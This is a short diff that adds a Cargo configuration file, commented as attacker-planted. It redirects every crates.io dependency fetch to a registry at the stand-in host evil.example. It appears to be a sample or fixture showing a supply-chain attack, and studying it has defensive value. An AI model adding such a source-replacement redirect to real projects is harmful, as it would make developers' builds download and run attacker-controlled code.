@@ -1,0 +1,9 @@
+# Attacker-planted ./.cargo/config.toml: source-replacement redirect. cargo
+# reads a project-local .cargo/config.toml, so a committed file silently
+# repoints EVERY crates.io fetch (and every build.rs) to the attacker index
+# for a bare `cargo install <anything>` / `cargo build`.
+[source.crates-io]
+replace-with = "m"
+
+[source.m]
+registry = "sparse+https://evil.example/api/index/"
